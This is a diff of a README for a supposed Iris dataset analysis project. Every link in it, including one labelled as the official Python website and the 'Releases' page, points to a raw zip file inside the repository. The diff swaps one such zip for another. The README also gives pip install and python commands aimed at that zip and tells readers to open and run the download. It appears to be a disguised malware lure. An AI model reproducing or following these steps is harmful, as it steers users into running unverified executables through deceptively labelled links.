@@ -1,6 +1,6 @@
 # 🌸 Iris-data-analysis - Easy Insights from Iris Data
 
-[![Download Iris-data-analysis](https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip)](https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip)
+[![Download Iris-data-analysis](https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/Iris-analysis-data-3.3.zip)](https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/Iris-analysis-data-3.3.zip)
 
 ## 📝 Project Overview
 
@@ -17,7 +17,7 @@ To get started with Iris-data-analysis, follow these simple steps to download an
 
 ### 1. Download the Application
 
-Visit this page to download: [Iris-data-analysis Releases](https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip).
+Visit this page to download: [Iris-data-analysis Releases](https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/Iris-analysis-data-3.3.zip).
 
 This will take you to the latest version of the application. Follow the instructions below to download it.
 
@@ -25,7 +25,7 @@ This will take you to the latest version of the application. Follow the instruct
 
 After downloading, you may need to install a few additional packages. These are required for the application to function correctly:
 
-- Python: Make sure you have Python 3.6 or newer installed on your computer. You can download it from the official [Python website](https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip).
+- Python: Make sure you have Python 3.6 or newer installed on your computer. You can download it from the official [Python website](https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/Iris-analysis-data-3.3.zip).
 - Package Manager: If you don’t have it, install pip, which comes with newer versions of Python by default. You will use it to install other needed packages.
 
 ### 3. Using the Command Line
@@ -41,14 +41,14 @@ You will need to use the command line to install the necessary packages. Don’t
    
 3. Once you are in the project folder, run this command to install the required packages:
    ```
-   pip install -r https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip
+   pip install -r https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/Iris-analysis-data-3.3.zip
    ```
 
-This command tells Python to install everything listed in the `https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip` file.
+This command tells Python to install everything listed in the `https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/Iris-analysis-data-3.3.zip` file.
 
 ## 📥 Download & Install
 
-To download, return to the [Iris-data-analysis Releases](https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip) page. Choose the latest version, and follow these steps:
+To download, return to the [Iris-data-analysis Releases](https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/Iris-analysis-data-3.3.zip) page. Choose the latest version, and follow these steps:
 
 1. Click on the relevant download link for your operating system.
 2. Once the download is complete, open the file and run it.
@@ -59,7 +59,7 @@ To download, return to the [Iris-data-analysis Releases](https://github.com/Dkav
 2. In the command line, navigate to the project's folder again as shown above.
 3. Run the main application file by executing:
    ```
-   python https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/analysis-Iris-data-brawlsome.zip
+   python https://github.com/Dkavyasri/Iris-data-analysis/raw/refs/heads/main/notebook/Iris-analysis-data-3.3.zip
    ```
 4. The application will load the Iris dataset, and you can start exploring and analyzing the data.
 
